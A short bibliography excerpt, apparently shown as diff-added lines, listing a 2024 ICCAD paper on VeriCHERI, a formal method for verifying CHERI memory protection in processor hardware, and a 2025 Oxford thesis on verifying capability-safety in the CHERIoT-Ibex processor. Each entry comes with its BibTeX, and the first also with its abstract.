+6. Anna Lena Duque Antón, Johannes Müller, Philipp Schmitz, Tobias Jauch, Alex Wezel, Lucas Deutschmann, Mohammad Rahmani Fadiheh, Dominik Stoffel and Wolfgang Kunz. [VeriCHERI: Exhaustive Formal Security Verification of CHERI at the RTL](https://doi.org/10.1145/3676536.3676841). *Accepted for publication at the 43rd International Conference on Computer-Aided Design (ICCAD ‘24)*, Association for Computing Machinery (2024). [doi] BibTeX @inproceedings{vericheri2024, author = {Duque Ant{\'o}n, Anna Lena and M{\"u}ller, Johannes and Schmitz, Philipp and Jauch, Tobias and Wezel, Alex and Deutschmann, Lucas and Fadiheh, Mohammad Rahmani and Stoffel, Dominik and Kunz, Wolfgang}, title = {VeriCHERI: Exhaustive Formal Security Verification of CHERI at the RTL}, doi = {https://doi.org/10.1145/3676536.3676841}, year = {2024}, month = oct, location = {New York, USA}, publisher = {Association for Computing Machinery}, booktitle = {Accepted for publication at the 43rd International Conference on Computer-Aided Design (ICCAD `24)} } Abstract Protecting data in memory from attackers continues to be a concern in computing systems. CHERI is a promising approach to achieve such protection, by providing and enforcing fine-grained memory protection directly in the hardware. Creating trust for the entire system stack, however, requires a gap-free verification of CHERI’s hardware-based protection mechanisms. Existing verification methods for CHERI target the abstract ISA model rather than the underlying hardware implementation. Fully ensuring the CHERI security guarantees for a concrete RTL implementation is a challenge in previous flows and demands high manual efforts. This paper presents VeriCHERI, a novel approach to security verification. It is conceptionally different from previous works in that it does not require any ISA specification. Instead of checking compliance with a golden ISA model, we check against well-established global security objectives of confidentiality and integrity. Fully covering these objectives, VeriCHERI uses as few as four unbounded properties to exhaustively prove or disprove any vulnerability. We demonstrate the effectiveness and scalability of VeriCHERI on a RISC-V based processor implementing a CHERI variant.
+7. Tita Rosemeyer. [Formal Verification of Capability-Safety in the CHERIoT-Ibex Processor](https://www.cs.ox.ac.uk/tom.melham/grads/Rosemeyer-2025-FVC). 2025. [pdf] BibTeX @mastersthesis{titarosemeyer2025, author = {Rosemeyer, Tita}, title = {Formal Verification of Capability-Safety in the CHERIoT-Ibex Processor}, school = {University of Oxford}, year = {2025}, pdf = {https://www.cs.ox.ac.uk/tom.melham/grads/Rosemeyer-2025-FVC} }
